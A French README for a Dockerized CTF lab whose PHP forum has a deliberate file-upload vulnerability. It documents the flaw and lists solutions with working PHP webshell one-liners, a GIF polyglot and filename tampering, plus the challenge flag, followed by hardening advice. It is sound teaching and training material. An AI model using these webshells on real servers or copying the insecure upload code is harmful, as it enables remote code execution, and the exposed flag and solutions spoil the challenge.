# 🔓 Challenge Upload - PHP File Upload Vulnerability

## 📋 Vue d'ensemble

Challenge CTF avec architecture Docker à double couche :
- **Launcher** : Service orchestrateur Flask qui gère les instances isolées
- **Challenge** : Forum PHP vulnérable avec faille d'upload

## 🏗️ Architecture

```
┌─────────────────────────────────────────┐
│  Launcher (Flask)                       │
│  - Gestion des sessions                 │
│  - Création/destruction des conteneurs  │
│  - Quota : 20 conteneurs max            │
│  - Timer : 15 minutes par instance      │
│  - Port : 5006                          │
└─────────────────────────────────────────┘
                    │
        ┌───────────┼───────────┐
        │           │           │
        ▼           ▼           ▼
  ┌─────────┐ ┌─────────┐ ┌─────────┐
  │Instance1│ │Instance2│ │Instance3│
  │Port 50k │ │Port 50k1│ │Port 50k2│
  │Forum PHP│ │Forum PHP│ │Forum PHP│
  │Isolé    │ │Isolé    │ │Isolé    │
  └─────────┘ └─────────┘ └─────────┘
```

## 🚀 Installation

### Prérequis
- Docker
- Docker Compose

### Étapes

1. **Build de l'image du challenge**
```bash
./build-challenge.sh
```

2. **Démarrage du launcher**
```bash
docker-compose up -d
```

3. **Accès**
- Launcher : http://localhost:5006
- Instances : http://localhost:50000-60000 (dynamique)

## 🎮 Utilisation

1. Accéder à http://localhost:5006
2. Cliquer sur "Démarrer le challenge"
3. Une instance isolée est créée (15 minutes max)
4. L'iframe affiche le forum vulnérable
5. Le compte à rebours indique le temps restant

## 🎯 Objectif du challenge

**Exploiter la vulnérabilité d'upload** pour :
1. Uploader un webshell PHP
2. Exécuter du code sur le serveur
3. Lire le fichier `/flag.txt`

**Flag** : `CTF{Upl04d_PHP_Sh3ll_M4st3r_2024}`

## 🔒 Vulnérabilités (intentionnelles)

### 1. Validation insuffisante
```php
// Seule l'extension est vérifiée
$allowedExtensions = ['jpg', 'jpeg', 'png', 'gif'];
$fileExtension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));
```

**Exploitation** :
- Double extension : `shell.php.jpg`
- Alternative PHP : `avatar.phtml`
- Extension case-sensitive bypass

### 2. Exécution PHP activée
```apache
# uploads/.htaccess
<FilesMatch "\.(php|php3|php4|php5|phtml)$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

### 3. Pas de vérification MIME
Le type MIME n'est jamais vérifié, seul le nom de fichier compte.

## 🛠️ Solutions possibles

### Méthode 1 : Double extension
```bash
# Créer un webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php.jpg

# Upload via le formulaire
# Accès: http://localhost:PORT/uploads/shell.php.jpg?cmd=cat%20/flag.txt
```

### Méthode 2 : Extension alternative
```bash
# Créer un webshell .phtml
echo '<?php passthru($_GET["c"]); ?>' > avatar.phtml

# Upload
# Accès: http://localhost:PORT/uploads/avatar.phtml?c=cat%20/flag.txt
```

### Méthode 3 : Polyglot GIF
```bash
# GIF + PHP
echo 'GIF89a; <?php system($_GET["x"]); ?>' > image.gif

# Upload
# Accès: http://localhost:PORT/uploads/image.gif?x=cat%20/flag.txt
```

### Méthode 4 : Burp Suite
1. Capturer la requête d'upload
2. Modifier `filename="avatar.jpg"` en `filename="shell.php"`
3. Forward
4. Accès au webshell

## ⚙️ Configuration

### Variables d'environnement

| Variable | Valeur par défaut | Description |
|----------|------------------|-------------|
| `MAX_CONTAINERS` | 20 | Nombre max d'instances simultanées |
| `CONTAINER_LIFETIME` | 900 | Durée de vie (secondes) |
| `PORT_RANGE_START` | 50000 | Premier port disponible |
| `PORT_RANGE_END` | 60000 | Dernier port disponible |

### Limites de ressources
- **RAM** : 256MB par conteneur
- **CPU** : 50% d'un core
- **Timeout** : 15 minutes

## 🔍 Monitoring

### API Stats
```bash
curl http://localhost:5006/stats
```

Retourne :
```json
{
  "active_containers": 3,
  "max_containers": 20,
  "available_slots": 17,
  "instances": [...]
}
```

## 🧹 Nettoyage

```bash
# Arrêter le launcher
docker-compose down

# Supprimer les instances orphelines
docker ps -a | grep upload_challenge | awk '{print $1}' | xargs docker rm -f

# Nettoyer les images
docker rmi upload-challenge:latest
```

## 🛡️ Protection (à implémenter)

Pour sécuriser ce type d'upload :

1. **Vérification MIME stricte**
```php
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mimeType = finfo_file($finfo, $fileTmpName);
$allowedMimes = ['image/jpeg', 'image/png', 'image/gif'];
if (!in_array($mimeType, $allowedMimes)) {
    die("Type MIME non autorisé");
}
```

2. **Renommer les fichiers**
```php
$newName = uniqid() . '.jpg'; // Ignorer l'extension originale
```

3. **Stocker hors webroot**
```php
$uploadDir = '/var/uploads/'; // Hors de /var/www/html
```

4. **Désactiver PHP dans uploads**
```apache
<Directory /var/www/html/uploads>
    php_flag engine off
</Directory>
```

5. **Vérification d'image réelle**
```php
if (!getimagesize($fileTmpName)) {
    die("Ce n'est pas une vraie image");
}
```

## 📊 Logging

Les logs du launcher :
```bash
docker logs upload_launcher
```

Exemples :
```
🚀 Upload Challenge Launcher démarré
📊 Quota: 20 conteneurs max
⏱️  Durée de vie: 900s (15 minutes)
🔌 Ports: 50000-60000
✅ Instance créée: session_abc123
🧹 Conteneur expiré nettoyé: session_xyz789
```

## ⚠️ Notes importantes

- Chaque utilisateur = 1 instance max
- Destruction automatique après 15 minutes
- Quota global : 20 instances
- Isolation complète entre instances
- Le flag est unique pour toutes les instances

## 📝 TODO

- [ ] Ajouter authentification pour le launcher
- [ ] Métriques Prometheus
- [ ] Dashboard admin avancé
- [ ] Rate limiting par IP
- [ ] Logs centralisés
